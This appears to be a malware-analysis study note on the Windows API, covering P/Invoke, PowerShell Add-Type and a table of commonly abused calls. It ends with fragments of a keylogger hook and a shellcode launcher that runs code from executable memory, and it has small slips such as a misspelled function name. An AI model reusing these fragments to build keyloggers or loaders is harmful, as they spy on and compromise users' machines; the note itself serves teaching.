#malwareanalysis #windows 

The Windows API provides the functionality to interact with key components in Windows Operating System.

## Subsystem and Hardware Interaction

Programs often need to access or modify Windows subsystems or hardware but are restricted to maintain machine stability. Hence, Win32 API, a library to interface between user mode and kernel was created.

Check more in [[Windows Internals#Windows API]]

## Components of the Windows API

 - **API**: A general term used to describe any call found in the win32 API structure.
 - **Header files or imports**: Define libraries to be imported during runtime, defined by header files or library imports. Uses pointers to obtain the function address.
 - **Core DLLs**: A group of 4 DLLs that define the call structure (KERNEL32, USER32 and ADVAPI32). These DLLs define kernel and user services that are not contained in a single subsystem.
 - **Supplemental DLLs**: Other DLLs defined as part of the Windows API. Controls separate subsystem of Windows OS.
 - **Call Structures**: Defines the API call itself and parameters of the call.
 - **API Calls**: The API call used within a program, with function address obtained from pointers.
 - **In/Out Parameters**: The parameter values that are defined by the call structures.

## OS Libraries

Each API call resides in memory and requires a pointer to the memory address. The process of obtaining pointers to these functions is obscured due to Address Space Layout Randomization (ASLR) implementations. Two of the most popular implementations are as follows:

### Windows Header File

Also known as Windows Loader. The loader determines what calls are being made and creates a thunk table to obtains function's addresses and pointers.

Once `windows.h` file is included on top of a program, any Win32 function can be called.

### P/Invoke (Platform Invoke)

This technology allows you to access structs, callbacks and functions in unmanaged libraries from your managed code.

It provides tools to handle the entire process of invoking an unmanaged function or Win32 API call. For e.g.: Below is an example of importing a DLL with options.

```csharp
using System;
using System.Runtime.InteropServices;

public class Program
{
[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
...
} 
```

In the above code, we are importing the DLL `user32` using the attribute: `DLLImport`.

```csharp
using System;
using System.Runtime.InteropServices;

public class Program
{
...
private static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);
} 
```

Now we can invoke the function as a managed method, but we are calling the unmanaged function!

## API Call Structure

API calls are the second main component of the Win32 library.  

API call functionality can be extended by modifying the naming scheme and appending a representational character.

| **Character** | **Explanation**                                                      |
| ------------- | -------------------------------------------------------------------- |
| A             | Represents an 8-bit character set with ANSI encoding                 |
| W             | Represents a Unicode encoding                                        |
| Ex            | Provides extended functionality or in/out parameters to the API call |
Each API call has a predefined structure to define its in/out parameters.

For e.g.: `WriteProcessMemory` API call

```cpp
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```

### C API Implementations

Low level programming languages such as C and C++ have pre configured set of libraries that we can use to access API calls.

The `windows.h` header file is used to define call structures and obtain function pointers. 

`#include <windows.h>`

#### Example: Using API call (Create a pop up window with a message)

In/out parameters for the call `CreateWindowExA`

```cpp
HWND CreateWindowExA(
  [in]           DWORD     dwExStyle, // Optional windows styles
  [in, optional] LPCSTR    lpClassName, // Windows class
  [in, optional] LPCSTR    lpWindowName, // Windows text
  [in]           DWORD     dwStyle, // Windows style
  [in]           int       X, // X position
  [in]           int       Y, // Y position
  [in]           int       nWidth, // Width size
  [in]           int       nHeight, // Height size
  [in, optional] HWND      hWndParent, // Parent windows
  [in, optional] HMENU     hMenu, // Menu
  [in, optional] HINSTANCE hInstance, // Instance handle
  [in, optional] LPVOID    lpParam // Additional application data
);
```

Complete Call to `CreateWindowExA`

```cpp
HWND hwnd = CreateWindowsEx(
	0, 
	CLASS_NAME, 
	L"Hello THM!", 
	WS_OVERLAPPEDWINDOW, 
	CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, 
	NULL, 
	NULL, 
	hInstance, 
	NULL
	);
```

Example application:

```cpp
BOOL Create(
        PCWSTR lpWindowName,
        DWORD dwStyle,
        DWORD dwExStyle = 0,
        int x = CW_USEDEFAULT,
        int y = CW_USEDEFAULT,
        int nWidth = CW_USEDEFAULT,
        int nHeight = CW_USEDEFAULT,
        HWND hWndParent = 0,
        HMENU hMenu = 0
        )
    {
        WNDCLASS wc = {0};

        wc.lpfnWndProc   = DERIVED_TYPE::WindowProc;
        wc.hInstance     = GetModuleHandle(NULL);
        wc.lpszClassName = ClassName();

        RegisterClass(&wc);

        m_hwnd = CreateWindowEx(
            dwExStyle, ClassName(), lpWindowName, dwStyle, x, y,
            nWidth, nHeight, hWndParent, hMenu, GetModuleHandle(NULL), this
            );

        return (m_hwnd ? TRUE : FALSE);
    }
```


## .NET and PowerShell API Implementations

**P/Invoke** allows us to import DLLs and assign pointers to API calls.

Example:

```cpp
class Win32 {
	[DllImport("kernel32")]
	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
}
```

The class function stores defined API calls and definitions to reference in future methods.

The library in which API call is stored can be imported using `DLLImport` The imported DLLs act in a similar way to the header packages but require that you import a specific DLL with the API call you are looking for.

From the DLL import we can create a new pointer to the API call we want to use, notably defined by the `intPtr`. Unlike other low-level languages, you must specify the in/out parameter structure in the pointer.

Now we can use the API call and its functionality in an application. 

Example: Application to get the Computer Name (.NET)

```csharp
class Win32 {
	[DllImport("kernel32")]
	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
}

static void Main(string[] args) {
	bool success;
	StringBuilder name = new StringBuilder(260);
	uint size = 260;
	success = GetComputerNameA(name, ref size);
	Console.WriteLine(name.ToString());
}
```

As done in .NET, the implementation is very similar in PowerShell. However, instead of defining a class we will define methods.

```powershell
$MethodDefinition = @"
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@;
```

Now that the calls are defined, we need to initialize them. We must create a new pointer for the pointer of each DLL  within the method definition. 

The function `Add-Type` will drop a temporary file in the `/temp` directory and compile needed functions using `csc.exe`. Below is an example of the function being used.

```powershell
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
```

We can now use the required API calls with the syntax below.

`[Win32.Kernel32]::<Imported Call>()`

## Commonly abused API calls

| **API Call**       | **Explanation**                                                                                                      |
| ------------------ | -------------------------------------------------------------------------------------------------------------------- |
| LoadLibraryA       | Maps a specified DLL into the address space of the calling process                                                   |
| GetUserNameA       | Retrieves the name of the user associated with the current thread                                                    |
| GetComputerNameA   | Retrieves a NetBIOS or DNS name of the local computer                                                                |
| GetVersionExA      | Obtains information about the version of the operating system currently running                                      |
| GetModuleFileNameA | Retrieves the fully qualified path for the file of the specified module and process                                  |
| GetStartupInfoA    | Retrieves contents of STARTUPINFO structure (window station, desktop, standard handles, and appearance of a process) |
| GetModuleHandle    | Returns a module handle for the specified module if mapped into the calling process's address space                  |
| GetProcAddress     | Returns the address of a specified exported DLL function                                                             |
| VirtualProtect     | Changes the protection on a region of memory in the virtual address space of the calling process                     |

## Case Studies

### Keylogger

P/Invoke definitions of the malware sample

```csharp
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
private static extern bool UnhookWindowsHookEx(IntPtr hhk);
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr GetModuleHandle(string lpModuleName);
private static int WHKEYBOARDLL = 13;
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr GetCurrentProcess();
```

| **API Call**        | **Explanation**                                                                                     |
| ------------------- | --------------------------------------------------------------------------------------------------- |
| SetWindowsHookEx    | Installs a memory hook into a hook chain to monitor for certain events                              |
| UnhookWindowsHookEx | Removes an installed hook from the hook chain                                                       |
| GetModuleHandle     | Returns a module handle for the specified module if mapped into the calling process's address space |
| GetCurrentProcess   | Retrieves a pseudo handle for the current process.                                                  |
How malware sets a hook on the current process:

```csharp
public static void Main() {
	_hookID = SetHook(_proc);
	Application.Run();
	UnhookWindowsHookEx(_hookID);
	Application.Exit();
}
private static IntPtr SetHook(LowLevelKeyboardProc proc) {
	using (Process curProcess = Process.GetCurrentProcess()) {
		return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
	}
}
```

### Shellcode Launcher

P/Invoke definitions of the malware sample

```csharp
private static UInt32 MEM_COMMIT = 0x1000;
private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
[DllImport("kernel32")]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
[DllImport("kernel32")]
private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
[DllImport("kernel32")]
private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
```

| **API Call**        | **Explanation**                                                                                                   |
| ------------------- | ----------------------------------------------------------------------------------------------------------------- |
| VirtualAlloc        | Reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process. |
| WaitForSingleObject | Waits until the specified object is in the signaled state or the time-out interval elapses                        |
| CreateThread        | Creates a thread to execute within the virtual address space of the calling process                               |
How the shellcode is written to and executed from memory.

```csharp
UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
IntPtr hThread = IntPtr.Zero;
UInt32 threadId = 0;
IntPtr pinfo = IntPtr.Zero;
hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
WaitForSingleObject(hThread, 0xFFFFFFFF);
return;
```

